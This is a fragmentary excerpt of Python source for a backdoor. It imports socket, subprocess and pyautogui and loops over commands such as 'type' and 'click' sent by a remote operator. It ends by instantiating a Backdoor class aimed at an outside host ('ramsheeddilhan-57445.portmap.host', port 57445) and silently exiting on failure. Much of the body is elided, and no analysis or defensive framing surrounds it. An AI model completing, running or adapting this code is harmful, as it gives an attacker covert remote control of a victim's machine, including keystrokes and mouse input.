import socket,os,subprocess,shutil,sys,json,base64,pyautogui,time
        ...
        while True:
            ...
            try:
                if command[0] == 'exit':
                	...
                	result = self.type(command[1])
                elif command[0] == 'click':
                	result = self.click(command[1],command[2])
...
try:
    backdoor = Backdoor('ramsheeddilhan-57445.portmap.host',57445)
    backdoor.run()
except:
    sys.exit()
